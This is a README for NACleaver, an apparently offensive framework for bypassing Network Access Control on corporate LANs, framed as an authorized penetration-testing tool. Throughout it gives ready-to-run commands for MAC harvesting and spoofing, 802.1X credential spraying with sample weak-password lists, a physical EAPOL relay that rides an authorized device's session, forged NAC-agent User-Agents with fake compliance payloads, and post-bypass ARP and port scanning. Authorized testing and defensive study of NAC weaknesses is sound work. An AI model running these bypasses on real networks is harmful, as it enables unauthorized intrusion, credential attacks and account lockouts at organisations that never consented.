# NACleaver

**Professional-grade Network Access Control bypass framework for authorized penetration testing.**

[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Platform: Linux](https://img.shields.io/badge/platform-linux-lightgrey.svg)](https://kernel.org)
[![Requires: root](https://img.shields.io/badge/requires-root-red.svg)](#requirements)

---

> **⚠️ LEGAL DISCLAIMER**
>
> NACleaver is designed exclusively for **authorized security testing**. You must have explicit written
> permission from the network owner before using this tool. Unauthorized use against networks you do
> not own or have permission to test is illegal under the Computer Fraud and Abuse Act (CFAA),
> the Computer Misuse Act (CMA), and equivalent laws worldwide. The authors assume no liability
> for misuse. Use responsibly.

---

## Table of Contents

- [What is NACleaver?](#what-is-nacleaver)
- [How NAC Enforcement Works](#how-nac-enforcement-works)
- [Architecture](#architecture)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Command Reference](#command-reference)
  - [recon — NAC Detection](#recon--nac-detection)
  - [mab — MAC Authentication Bypass](#mab--mac-authentication-bypass)
  - [dot1x — 8021X Authentication Bypass](#dot1x--8021x-authentication-bypass)
  - [relay — Transparent 8021X Relay](#relay--transparent-8021x-relay)
  - [posture — Posture Check Bypass](#posture--posture-check-bypass)
  - [auto — Intelligent Auto Mode](#auto--intelligent-auto-mode)
  - [post — Post-Auth Enumeration](#post--post-auth-enumeration)
- [Global Options](#global-options)
- [Output Format](#output-format)
- [Configuration](#configuration)
- [Real-World Scenarios](#real-world-scenarios)
- [OUI Database](#oui-database)
- [Operational Notes](#operational-notes)
- [Project Structure](#project-structure)

---

## What is NACleaver?

NAC (Network Access Control) systems enforce security policies at the network port level — verifying
device identity or compliance before granting access to the corporate LAN. NACleaver is a modular
framework that automates the most effective bypass techniques against common NAC implementations,
including Cisco ISE, Aruba ClearPass, Forescout, and open-standard 802.1X deployments.

**What it does:**

| Module | Technique |
|---|---|
| `recon` | Fingerprints the NAC type in use before attempting any bypass |
| `mab` | Harvests authorized MAC addresses and impersonates them |
| `dot1x` | Attempts 802.1X authentication with 6 EAP methods and automatic fallback |
| `relay` | Physically inserts between switch and authorized endpoint; transparently relays 802.1X |
| `posture` | Detects and bypasses post-auth posture/compliance checks |
| `auto` | Chains all of the above intelligently based on detected NAC type |
| `post` | Enumerates the internal network after a successful bypass |

---

## How NAC Enforcement Works

NAC enforces access at layer 2, sitting between your device and the rest of the network:

```
  Attacker's Device
         │
  [Switch Port]  ← NAC enforcement point
         │
    [Network]
```

**802.1X (Dot1X):** The switch sends EAPOL frames to your device demanding authentication before
the port opens. The device must authenticate against a RADIUS server (e.g. Cisco ISE) using
a supported EAP method — typically PEAP/MSCHAPv2 with Active Directory credentials, or EAP-TLS
with a certificate.

**MAB (MAC Authentication Bypass):** The switch reads your device's source MAC address and sends
it to RADIUS. If that MAC is in an approved list (known printers, VoIP phones, IoT devices),
the port opens — no credentials needed. Common for devices that can't do 802.1X.

**Posture checks:** Some NAC solutions add a second gate after authentication — verifying that
antivirus is running, patches are current, or a NAC agent is installed. Failure moves the device
to a restricted quarantine VLAN.

---

## Architecture

NACleaver is organized into self-contained modules that can be run independently or chained
through the `auto` mode:

```
NACleaver/
├── nacleaver.py              # CLI entry point
├── config.yaml               # Runtime defaults
├── core/
│   ├── recon.py              # NAC fingerprinting
│   ├── mab.py                # MAB bypass
│   ├── dot1x.py              # 802.1X bypass
│   ├── relay.py              # Transparent relay (multiprocessing)
│   ├── posture.py            # Posture bypass
│   └── utils.py              # Shared helpers, Cleanup registry
├── modules/
│   └── post_auth.py          # Post-bypass enumeration
└── data/
    ├── oui_seed.py           # 955 built-in OUI entries
    └── oui.db                # SQLite OUI database (auto-created)
```

### The `auto` pipeline

When NAC type is unknown, `auto` runs the full attack chain:

```
  run_recon()
      │
      ├─ DOT1X / DOT1X_STRICT ──→ run_dot1x() [credentials]
      │                        └→ run_relay() [no credentials, second interface]
      │
      ├─ MAB_OR_OPEN ──────────→ run_mab_bypass()
      │
      ├─ QUARANTINE_VLAN ──────→ run_mab_bypass() → fallback: run_dot1x()
      │
      └─ CAPTIVE_PORTAL ───────→ detect_and_bypass_posture()
                │
                ▼ (on success)
          detect_and_bypass_posture()
                │
                ▼
          run_post_auth()
```

### Relay module design

The relay attack requires two physical network interfaces. Your machine goes physically between
the switch and an authorized endpoint:

```
[Switch 802.1X Port] ─── [iface_switch  Attacker  iface_endpoint] ─── [Authorized Endpoint]
                          ↑                                          ↑
                     EAPOL relay                               EAPOL relay
                     (Process 1)                               (Process 2)
```

All non-EAPOL traffic is bridged transparently by the Linux kernel (`ip link add type bridge`).
EAPOL frames are dropped from the kernel bridge (`ebtables -t broute`) and relayed manually by
two `multiprocessing.Process` instances — one per direction — each running an independent Scapy
sniff loop. This avoids Python's GIL during timing-sensitive EAPOL forwarding. When an EAP-Success
frame is detected on the switch-facing interface, the port is authorized and a DHCP lease is
requested on the bridge interface.

---

## Requirements

### Python

- Python **3.10 or later** (required; uses union type syntax and structural pattern features)

```
scapy>=2.5.0
rich>=13.0.0
netifaces>=0.11.0
pyyaml>=6.0.0
python-nmap>=0.7.1
requests>=2.31.0
```

### System tools

NACleaver checks for these at startup and warns if any are missing. Missing tools disable the
dependent module but do not exit.

| Tool | Used by | Install |
|---|---|---|
| `wpa_supplicant` | dot1x | `apt install wpasupplicant` |
| `wpa_cli` | dot1x | included with wpasupplicant |
| `nmcli` | dot1x (fallback) | `apt install network-manager` |
| `dhclient` | mab, dot1x, relay | `apt install isc-dhcp-client` |
| `ip` | all | `apt install iproute2` |
| `ebtables` | relay | `apt install ebtables` |
| `brctl` | relay | `apt install bridge-utils` |
| `arping` | post_auth | `apt install arping` |

### Platform

- **Kali Linux** (primary target)
- Any Debian/Ubuntu-based Linux with the above tools installed
- Requires a **root** shell — NACleaver exits immediately if not root

---

## Installation

```bash
git clone https://github.com/your-username/NACleaver.git
cd NACleaver

# Install Python dependencies
pip3 install -r requirements.txt

# Install system tools (Kali/Debian)
apt install -y wpasupplicant network-manager isc-dhcp-client \
               iproute2 ebtables bridge-utils arping
```

No build step, no compilation. Run directly:

```bash
sudo python3 nacleaver.py --help
```

---

## Quick Start

```bash
# 1. Identify what NAC is in use
sudo python3 nacleaver.py -i eth0 recon

# 2a. Bypass MAB (unknown or open port)
sudo python3 nacleaver.py -i eth0 mab

# 2b. Bypass 802.1X with credentials
sudo python3 nacleaver.py -i eth0 dot1x -u pentest -p 'Password123'

# 2c. Relay attack (no credentials, second NIC required)
sudo python3 nacleaver.py -i eth0 -i2 eth1 relay

# 3. Let auto mode decide
sudo python3 nacleaver.py -i eth0 auto -u pentest -p 'Password123'
```

---

## Command Reference

All commands accept their flags both before and after the subcommand name:

```bash
# Both of these are equivalent
sudo python3 nacleaver.py -i eth0 -u pentest dot1x
sudo python3 nacleaver.py -i eth0 dot1x -u pentest
```

---

### `recon` — NAC Detection

Determines the NAC enforcement type before attempting any bypass. Run this first on an unknown
segment — trying 802.1X against a MAB-only port (or vice versa) wastes time and can trigger lockouts.

```bash
sudo python3 nacleaver.py -i eth0 recon [--timeout 30]
```

**Detection pipeline:**

1. **EAPOL sniff** — Listens for EAP-over-LAN frames for `timeout` seconds. If EAPOL is seen,
   the port is 802.1X. Observed EAP type codes (PEAP, TTLS, TLS, etc.) are recorded.

2. **DHCP probe** — If no EAPOL observed, sends a DHCP Discover and waits for an offer.
   No offer = port is fully blocked (`DOT1X_STRICT`).

3. **Captive portal check** — If DHCP succeeded, sends `GET http://1.1.1.1` and checks for:
   - `3xx` redirect → `CAPTIVE_PORTAL`
   - Connection refused/timeout → `QUARANTINE_VLAN`
   - `200 OK` → `MAB_OR_OPEN`

4. **CDP/LLDP parse** — Opportunistically captures switch discovery frames to extract switch
   hostname and port ID (useful for engagement documentation).

**NAC types returned:**

| Type | Meaning |
|---|---|
| `DOT1X` | EAPOL frames observed — port enforces 802.1X |
| `DOT1X_STRICT` | No DHCP offer at all — port fully blocked before auth |
| `MAB_OR_OPEN` | DHCP works, HTTP traffic flows freely |
| `QUARANTINE_VLAN` | DHCP works, routing is restricted |
| `CAPTIVE_PORTAL` | DHCP works, HTTP is redirected |
| `UNKNOWN` | Detection inconclusive |

**Example output:**

```
╔══════════════════════════════╗
║      Recon Results           ║
╟──────────────────────────────╢
║ NAC Type    │ DOT1X          ║
║ EAPOL Count │ 6              ║
║ EAP Methods │ 25 (PEAP)      ║
║ Switch      │ sw-floor3.corp ║
║ Port        │ GigE0/14       ║
║ Duration    │ 30.1s          ║
╚══════════════════════════════╝
```

---

### `mab` — MAC Authentication Bypass

MAB authenticates endpoints by their MAC address alone. The bypass: passively observe which MAC
addresses are sending traffic on the segment (meaning they're already authorized), then impersonate
the best candidate.

```bash
# Harvest MACs for 60 seconds, pick the best candidate automatically
sudo python3 nacleaver.py -i eth0 mab

# Use a specific MAC you already know
sudo python3 nacleaver.py -i eth0 mab --mac aa:bb:cc:dd:ee:ff

# Harvest for longer on a quiet segment
sudo python3 nacleaver.py -i eth0 mab --harvest-duration 120
```

**Scoring algorithm:**

Each observed MAC address is scored to identify the best impersonation target. The goal is to
find an authorized workstation — not a switch, printer, or network appliance.

| Signal | Score adjustment |
|---|---|
| Frame count (capped at 100) | `+0` to `+100` |
| ARP requests seen | `+15` |
| IPv4 traffic seen | `+8` |
| STP frames seen (switch uplink) | `−30` |
| CDP/LLDP frames seen (network device) | `−30` |
| OUI category: workstation | `+20` |
| OUI category: mobile | `+5` |
| OUI category: printer | `−10` |
| OUI category: network device | `−50` |

After scoring, the highest-ranked MAC is spoofed via `ip link set address`, the interface is
bounced, and `dhclient` requests a new lease. The original MAC is always restored on exit
(unless `--no-restore-mac` is set).

---

### `dot1x` — 802.1X Authentication Bypass

Attempts 802.1X authentication using the real kernel 802.1X stack (`wpa_supplicant` primary,
`nmcli` fallback). Supports 6 EAP methods with automatic priority-ordered fallback and
credential spraying from a file.

```bash
# Single credential, auto-try all EAP methods
sudo python3 nacleaver.py -i eth0 dot1x -u pentest -p 'Password123'

# Force a specific EAP method
sudo python3 nacleaver.py -i eth0 dot1x -u pentest -p 'Password123' --eap-method peap

# Spray credentials from a file
sudo python3 nacleaver.py -i eth0 dot1x -C creds.txt --spray-delay 3.0

# EAP-TLS with a client certificate
sudo python3 nacleaver.py -i eth0 dot1x -u pentest \
  --eap-method tls \
  --client-cert /path/to/client.pem \
  --private-key /path/to/key.pem

# Use nmcli backend instead of wpa_supplicant
sudo python3 nacleaver.py -i eth0 dot1x -u pentest -p 'Password123' --backend nmcli
```

**EAP method priority order (default):**

| Priority | Method | Common use case |
|---|---|---|
| 1 | `peap` (PEAP/MSCHAPv2) | Enterprise AD authentication — most common |
| 2 | `ttls_mschapv2` (TTLS/MSCHAPv2) | Alternative to PEAP |
| 3 | `ttls_pap` (TTLS/PAP) | Legacy deployments |
| 4 | `pwd` (EAP-PWD) | Password-based, RFC 5931 |
| 5 | `md5` (EAP-MD5) | Legacy challenge-response |
| 6 | `tls` (EAP-TLS) | Certificate-based — requires `--client-cert` |

**Credential file format:**

```
# Lines starting with # are ignored
admin:Password123
jsmith:Summer2024!
serviceaccount:
```

Each `identity:password` pair is tried against every enabled EAP method (in priority order)
before moving to the next credential. A successful auth returns immediately.

---

### `relay` — Transparent 802.1X Relay

The most powerful bypass — no credentials required. Physical insertion between the switch and
an authorized endpoint. The legitimate device completes 802.1X authentication normally; the
attacker's machine rides along inside the authorized bridge session.

**Physical setup required:**

```
[Switch]  ←──── eth0 [Attacker Machine] eth1 ────→  [Authorized Endpoint]
```

Both NICs must be physically cabled — `eth0` to the switch, `eth1` to any authorized endpoint
(a nearby workstation, printer, IP phone, etc.).

```bash
sudo python3 nacleaver.py -i eth0 -i2 eth1 relay

# Extended timeout for slower auth exchanges
sudo python3 nacleaver.py -i eth0 -i2 eth1 relay --timeout 120
```

**What happens:**

1. A Linux bridge (`nacleaver_br`) is created and both interfaces are added as members
2. STP is disabled on the bridge to avoid topology change notifications to the switch
3. `ebtables` drops EAPOL frames (0x888E) from kernel bridging so we relay them manually
4. Two `multiprocessing.Process` instances start — one sniffing each interface, forwarding
   EAPOL frames in the opposite direction
5. All other traffic (DHCP, ARP, TCP/UDP) passes through the kernel bridge transparently
6. When an EAP-Success frame is observed on the switch side, the port is marked authorized
7. `dhclient` requests a lease on the bridge interface
8. On exit or timeout: bridge is torn down, ebtables is flushed, original state restored

The bridge and ebtables rule are registered with the `Cleanup` singleton, so `Ctrl+C` or
`SIGTERM` triggers a full teardown automatically.

---

### `posture` — Posture Check Bypass

Some NAC systems enforce a second authentication gate after 802.1X — verifying endpoint
compliance (antivirus active, patches current, agent installed). Failure moves the device to
a restricted VLAN even after successful 802.1X auth.

```bash
# Detect and attempt bypass (requires an IP to already be assigned)
sudo python3 nacleaver.py -i eth0 posture
```

**Detection probes:**

| Probe | How it works |
|---|---|
| HTTP redirect | `GET http://1.1.1.1` — `3xx` response indicates captive/posture portal |
| Cisco ISE | TCP connect to gateway:8905; HTTPS fingerprint on gateway:8443 |
| Forescout | TCP connect to gateway:1040 (SecureConnector port) |
| Aruba ClearPass | TCP connect to gateway:8081; HTTPS fingerprint check |

**HTTP posture bypass:**

When an HTTP redirect-based posture portal is detected, NACleaver attempts to satisfy it by
impersonating known NAC agents:

```
User-Agent: CiscoNACAgent/4.9.1.14
User-Agent: Aruba-OnConnect/6.10.0
User-Agent: ForeScout-SecureConnector/5.0.0.1
...
```

Each agent header is combined with fake compliance payloads:
```json
{"status": "compliant", "av": "enabled", "os": "Windows 10", "patches": "current"}
```

Success is determined by a `200 OK` response containing keywords: `success`, `compliant`,
`pass`, or `allowed`.

---

### `auto` — Intelligent Auto Mode

Runs the full recon-bypass-posture-enumeration pipeline with automatic strategy selection.

```bash
# Full auto with credentials
sudo python3 nacleaver.py -i eth0 auto -u pentest -p 'Password123'

# Full auto with credential file and relay fallback
sudo python3 nacleaver.py -i eth0 -i2 eth1 auto -C creds.txt

# Auto without post-auth enumeration
sudo python3 nacleaver.py -i eth0 auto -u pentest -p 'pass' --no-post

# Auto without posture bypass attempt
sudo python3 nacleaver.py -i eth0 auto -u pentest -p 'pass' --no-posture
```

**Strategy selection:**

| Detected NAC type | Strategy chosen |
|---|---|
| `DOT1X` / `DOT1X_STRICT` | `dot1x` if credentials given; `relay` if `-i2` given; error otherwise |
| `MAB_OR_OPEN` | `mab` |
| `QUARANTINE_VLAN` | `mab` → fallback to `dot1x` if credentials given |
| `CAPTIVE_PORTAL` | `posture` bypass directly |
| `UNKNOWN` | `mab` → fallback to `dot1x` if credentials given |

After any successful bypass, `posture` check and `post` enumeration run automatically
(unless disabled with `--no-posture` / `--no-post`).

---

### `post` — Post-Auth Enumeration

Enumerates the internal network segment after a successful bypass. Runs automatically in
`auto` mode; can also be run standalone if you already have an IP.

```bash
sudo python3 nacleaver.py -i eth0 post
```

**What it does:**

1. **ARP sweep** — Sends ARP requests to every host in the subnet; records IP + MAC pairs
2. **OUI lookup** — Resolves each discovered MAC to a vendor name via the OUI database
3. **TCP port scan** — Scans a targeted port list on each discovered host using a thread pool
   (20 concurrent workers, 0.5s timeout per port)
4. **Reverse DNS** — Attempts FQDN resolution for each host
5. **Gateway probe** — Scans the gateway for open ports and grabs the HTTP `Server` header
6. **NAC server fingerprint** — Checks gateway and DNS servers for NAC-specific open ports
   (8905/ISE, 8081/ClearPass, 1040/Forescout) and rDNS hints

**Ports scanned by default:**
`22, 80, 443, 445, 3389, 8080, 8443, 8905, 8081, 1040`

---

## Global Options

These options work on every subcommand, placed either before or after the subcommand name:

| Option | Default | Description |
|---|---|---|
| `-i`, `--interface` | *required* | Primary network interface |
| `-i2`, `--interface2` | — | Second interface (relay mode) |
| `-u`, `--username` | — | 802.1X username |
| `-p`, `--password` | `""` | 802.1X password |
| `-C`, `--creds-file` | — | Credential file (`user:pass` per line) |
| `-m`, `--mac` | — | Specific MAC to spoof (MAB mode) |
| `--timeout` | `15` | Per-attempt timeout in seconds |
| `--harvest-duration` | `60` | MAC harvest window in seconds (MAB) |
| `--eap-method` | `auto` | EAP method: `peap`, `ttls_mschapv2`, `ttls_pap`, `pwd`, `md5`, `tls`, `auto` |
| `--spray-delay` | `2.0` | Seconds between credential spray attempts |
| `--backend` | `auto` | 802.1X backend: `wpa_supplicant`, `nmcli`, `auto` |
| `--conn-name` | `NACleaver-8021x` | nmcli connection name |
| `--client-cert` | — | Client certificate path (EAP-TLS) |
| `--private-key` | — | Private key path (EAP-TLS) |
| `--no-restore-mac` | `false` | Do not restore original MAC on exit |
| `--no-posture` | `false` | Skip posture bypass after auth |
| `--no-post` | `false` | Skip post-auth enumeration |
| `-o`, `--output` | `output/` | Output directory for JSON results |
| `-v`, `--verbose` | `false` | Verbose logging |

---

## Output Format

Every command writes timestamped results to `output/nacleaver_YYYYMMDD_HHMMSS.json`:

```json
{
  "timestamp": "2026-01-15T14:23:01",
  "interface": "eth0",
  "command": "auto",
  "recon": {
    "nac_type": "DOT1X",
    "eap_methods_observed": [25],
    "dhcp_lease": null,
    "switch_vendor": "sw-core.corp",
    "switch_port": "GigabitEthernet1/0/24",
    "raw_eapol_count": 4
  },
  "bypass": {
    "success": true,
    "method_used": "peap_mschapv2",
    "identity": "pentest",
    "obtained_ip": "10.10.50.147",
    "backend_used": "wpa_supplicant"
  },
  "posture": {
    "posture_type": "none",
    "bypass_attempted": false,
    "details": "No posture check detected"
  },
  "post_auth": {
    "subnet": "10.10.50.0/24",
    "gateway": "10.10.50.1",
    "dns_servers": ["10.10.1.10"],
    "nac_server_type": "Cisco ISE",
    "nac_server_ip": "10.10.50.1",
    "discovered_hosts": [
      {
        "ip": "10.10.50.23",
        "mac": "d0:67:e5:aa:bb:cc",
        "vendor": "Dell Inc",
        "open_ports": [22, 445, 3389],
        "hostname": "ws-finance-04.corp"
      }
    ]
  },
  "summary": {
    "success": true,
    "obtained_ip": "10.10.50.147",
    "bypass_method": "dot1x"
  }
}
```

Log files are also written to `output/nacleaver_YYYYMMDD_HHMMSS.log`.

---

## Configuration

`config.yaml` sets default timeouts and behavior. CLI flags always take precedence:

```yaml
recon:
  eapol_timeout: 30       # Seconds to sniff for EAPOL frames
  dhcp_timeout: 10        # Seconds to wait for DHCP offer
  cdp_lldp_timeout: 15    # Seconds to capture CDP/LLDP

mab:
  harvest_duration: 60    # MAC observation window
  min_score: 0.0          # Minimum score to consider a candidate

dot1x:
  default_timeout: 15     # Per-EAP-method timeout
  spray_delay: 2.0        # Delay between spray attempts
  preferred_backend: auto # wpa_supplicant | nmcli | auto
  method_order:
    - peap_mschapv2
    - ttls_mschapv2
    - ttls_pap
    - pwd
    - md5

relay:
  auth_timeout: 90        # Max wait for EAP-Success
  dhcp_timeout: 15

posture:
  probe_timeout: 5
  ise_ports: [443, 8443, 8905]
  clearpass_ports: [443, 8081]
  forescout_ports: [443, 1040]

post_auth:
  arp_sweep: true
  arp_timeout: 2
  port_scan: true
  port_scan_timeout: 0.5
  ports: [22, 80, 443, 445, 3389, 8080, 8443, 8905, 8081, 1040]
```

---

## Real-World Scenarios

### Scenario 1: Unknown corporate segment

You're plugged into a wall jack and don't know what NAC is deployed.

```bash
# Step 1: reconnaissance
sudo python3 nacleaver.py -i eth0 recon --timeout 30

# Output says: NAC Type = MAB_OR_OPEN
# Step 2: MAB bypass
sudo python3 nacleaver.py -i eth0 mab --harvest-duration 90 -v
```

### Scenario 2: 802.1X with known domain credentials

```bash
sudo python3 nacleaver.py -i eth0 auto \
  -u 'CORP\pentest.user' \
  -p 'Summer2024!' \
  --eap-method peap \
  -v
```

### Scenario 3: 802.1X, no credentials — relay attack

```bash
# Physical setup: eth0 → switch, eth1 → IP phone already on the desk
sudo python3 nacleaver.py -i eth0 -i2 eth1 relay --timeout 90 -v
```

### Scenario 4: Credential spray from a list

```bash
cat > creds.txt << EOF
# Common weak passwords
administrator:Password1
svc_backup:Backup2024
helpdesk:Welcome123
EOF

sudo python3 nacleaver.py -i eth0 dot1x \
  -C creds.txt \
  --spray-delay 5.0 \
  --eap-method peap \
  -v
```

### Scenario 5: Post-bypass enumeration only

If you already have network access (VPN, previous bypass) and just want to enumerate:

```bash
sudo python3 nacleaver.py -i eth0 post -v
```

---

## OUI Database

NACleaver uses an SQLite OUI database (`data/oui.db`) to resolve MAC address prefixes to
vendor names and categories, which directly affects MAB candidate scoring.

The database auto-creates from `data/oui_seed.py` (955 built-in entries) on first run.

**Loading the full IEEE OUI database (optional, recommended):**

The IEEE publishes the complete OUI registry (~30,000 entries) as a free CSV download.
Placing it at `data/oui_full.csv` causes `init_oui_db()` to load it automatically:

```bash
# Download the IEEE OUI CSV
curl -o data/oui_full.csv \
  "https://standards-oui.ieee.org/oui/oui.csv"

# NACleaver will load it on next run
sudo python3 nacleaver.py -i eth0 mab
```

The CSV is parsed in IEEE format (`Registry,Assignment,Organization Name,Organization Address`).
Entries are categorized automatically using vendor name keyword matching.

---

## Operational Notes

### MAC restoration

NACleaver's `Cleanup` class registers the original MAC address before any spoof and restores
it on exit — including on `Ctrl+C` and `SIGTERM`. The sequence:

1. `Cleanup.register_mac(iface, original_mac)` is called **before** `ip link set address`
2. On exit: `wpa_supplicant` / `dhclient` are killed, then MAC is restored via `ip link`

Use `--no-restore-mac` to leave the spoofed MAC in place (e.g. for persistence testing).

### Bridge teardown

The relay module's bridge (`nacleaver_br`) and ebtables rule are registered with `Cleanup`
and torn down automatically. Forcefully killed processes (e.g. `kill -9`) may leave the bridge
in place — clean up manually with:

```bash
ebtables -t broute -F BROUTING
ip link set eth0 nomaster
ip link set eth1 nomaster
ip link delete nacleaver_br
```

### wpa_supplicant conflicts

NetworkManager and wpa_supplicant can conflict on managed interfaces. NACleaver calls
`pkill -f "wpa_supplicant.*{iface}"` before launching its own instance. If NetworkManager
re-claims the interface, use `--backend nmcli` or:

```bash
nmcli device set eth0 managed no
```

### Promiscuous mode

`recon` and `mab` temporarily enable promiscuous mode on the interface for frame capture.
The original state is restored after sniffing completes.

### Rate limiting and lockout

Some RADIUS servers implement authentication rate limiting or lockout policies. Use
`--spray-delay` to add delay between credential attempts. The default is 2 seconds;
increase to 10–30 seconds if lockout policies are in scope.

---

## Project Structure

```
NACleaver/
├── nacleaver.py          # CLI entry point; argparse; command dispatch
├── requirements.txt
├── config.yaml           # Default configuration
├── core/
│   ├── __init__.py
│   ├── utils.py          # Helpers: interface ops, subprocess, logging, Cleanup
│   ├── recon.py          # EAPOL/DHCP/CDP/portal detection
│   ├── mab.py            # OUI DB, MAC scoring, spoof + DHCP
│   ├── dot1x.py          # wpa_supplicant/nmcli backends, EAP methods, spray
│   ├── relay.py          # Linux bridge, ebtables, multiprocessing EAPOL relay
│   └── posture.py        # ISE/Forescout/ClearPass detection, HTTP bypass
├── modules/
│   ├── __init__.py
│   └── post_auth.py      # ARP sweep, port scan, NAC fingerprint, DHCP lease parse
└── data/
    ├── oui_seed.py       # 955 built-in OUI entries (Python dict)
    └── oui.db            # SQLite DB (auto-created on first run)
```

Each module can be tested standalone with root:

```bash
sudo python3 core/recon.py eth0
sudo python3 core/mab.py eth0
sudo python3 core/dot1x.py eth0 pentest Password123
sudo python3 core/relay.py eth0 eth1
sudo python3 core/posture.py eth0
sudo python3 modules/post_auth.py eth0
```

---

## Contributing

Pull requests are welcome. Please:

- Maintain Python 3.10+ compatibility
- Keep all subprocess calls as list arguments (no `shell=True`)
- Catch specific exception types — no bare `except:`
- Test with `python3 -m py_compile` before submitting
- Do not add features that cannot be fully implemented — no stubs, no TODOs

---

## License

MIT License. See [LICENSE](LICENSE) for details.

This software is provided for authorized security testing only. The authors are not responsible
for illegal or unauthorized use.
